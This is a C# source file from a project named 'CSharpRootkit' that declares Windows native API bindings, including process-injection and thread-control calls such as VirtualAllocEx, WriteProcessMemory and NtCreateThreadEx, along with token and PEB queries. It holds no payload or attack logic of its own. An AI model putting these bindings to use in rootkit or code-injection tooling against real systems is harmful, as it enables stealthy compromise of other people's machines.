﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading.Tasks;
using static CSharpRootkit.InternalStructs;

namespace CSharpRootkit
{
    public class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hProcess);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
            IntPtr hSourceHandle,
            IntPtr hTargetProcessHandle,
            ref IntPtr lpTargetHandle,
            uint dwDesiredAccess,
            bool bInheritHandle,
            uint dwOptions
            );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(
             IntPtr hProcess,
             IntPtr lpBaseAddress,
             IntPtr lpBuffer,
             UIntPtr dwSize,
             ref UIntPtr lpNumberOfBytesRead
            );
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetCurrentProcessId();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetThreadId(IntPtr Thread);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint SuspendThread(IntPtr Thread);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr Thread);


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetCurrentThreadId();

        

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtGetNextThread(IntPtr ProcessHandle, IntPtr ThreadHandle, uint DesiredAccess, uint HandleAttributes, uint Flags, out IntPtr NewThreadHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtWaitForSingleObject(IntPtr Handle, bool Alertable, IntPtr TimeOut);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtQueryInformationThread(IntPtr threadHandle, THREADINFOCLASS threadInformationClass, IntPtr threadInformation, uint threadInformationLength, out uint returnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern void SetLastError(uint dwErrCode);

        [DllImport("ntdll.dll", SetLastError = true, EntryPoint = "NtQueryInformationProcess")]
        private static extern int _NtQueryPbi32(
        IntPtr ProcessHandle,
        InternalStructs.PROCESSINFOCLASS ProcessInformationClass,
        ref InternalStructs.PROCESS_BASIC_INFORMATION ProcessInformation,
        uint BufferSize,
        ref uint NumberOfBytesRead);

        public static int NtQueryPbi32(IntPtr ProcessHandle,
        InternalStructs.PROCESSINFOCLASS ProcessInformationClass,
        ref InternalStructs.PROCESS_BASIC_INFORMATION ProcessInformation,
        uint BufferSize,
        ref uint NumberOfBytesRead) 
        {
            int result = _NtQueryPbi32(ProcessHandle, ProcessInformationClass, ref ProcessInformation, BufferSize, ref NumberOfBytesRead);
            if (Environment.Is64BitProcess) 
            {
                ProcessInformation.PebBaseAddress += Environment.SystemPageSize;//when im a 64bit process the PebBaseAddress will be the address of the 64bit peb, i need to 32bit peb which shoud be exactly 1 page size away
            }
            return result;
        }


        [DllImport("ntdll.dll", SetLastError = true, EntryPoint = "NtQueryInformationProcess")]
        public static extern int NtQueryPbi64From64(
        IntPtr ProcessHandle,
        InternalStructs.PROCESSINFOCLASS ProcessInformationClass,
        ref InternalStructs.PROCESS_BASIC_INFORMATION ProcessInformation,
        uint BufferSize,
        ref uint NumberOfBytesRead);


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool IsProcessCritical(IntPtr hProcess, out bool Critical);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);
        
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int VirtualQuery(IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibraryW(string LibraryName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hmodule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr GetModuleHandleW(string lpModuleName);

        [DllImport("kernel32.dll")]
        public static extern InternalStructs.FileType GetFileType(IntPtr hFile);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint GetFinalPathNameByHandleW(IntPtr hFile, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpszFilePath, uint cchFilePath, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = false)]
        public static extern void CopyMemory(IntPtr dest, IntPtr src, UIntPtr count);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtSuspendThread(IntPtr ThreadHandle, IntPtr PreviousSuspendCount);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtResumeThread(IntPtr ThreadHandle, IntPtr SuspendCount);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateThreadEx(ref IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetProcessIdOfThread(IntPtr handle);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool QueryFullProcessImageNameW(IntPtr hProcess, uint dwFlags, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpExeName, ref uint lpdwSize);

        [DllImport("kernel32.dll")]
        public static extern bool AllocConsole();

    }
}
